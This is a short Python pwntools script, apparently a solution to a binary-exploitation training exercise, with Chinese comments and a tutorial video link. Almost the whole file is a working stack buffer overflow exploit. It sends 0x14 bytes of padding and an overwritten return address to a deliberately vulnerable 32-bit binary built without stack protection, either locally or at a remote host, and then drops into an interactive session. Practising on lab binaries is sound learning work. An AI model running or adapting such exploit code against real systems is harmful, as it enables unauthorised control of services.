'''
Author: 白银
Date: 2022-11-17 16:52:35
LastEditTime: 2022-11-17 17:11:48
LastEditors: 白银
Description: gcc question_4_1.c -m32 -fno-stack-protector -no-pie -fomit-frame-pointer -o question_4_1_x86_esp   https://www.bilibili.com/video/BV1mr4y1Y7fW?t=449.3
'''
from pwn import *

context(log_level='debug', arch='i386', os='linux')

pwnfile = './question_4_1_x86_esp'
state = 0

if state == 0:
    io = remote("192.168.61.134", 8887)
else:
    io = process(pwnfile)

# 本地用
# elf = ELF(pwnfile)
# rop = ROP(pwnfile)

padding = 0x14
return_addr = 0x08049176
payload = flat(['a' * padding, return_addr])

delimiter = 'input:'

# io.sendlineafter(delimiter, payload)  #本地用
io.sendline(payload)  # 远程用
io.interactive()
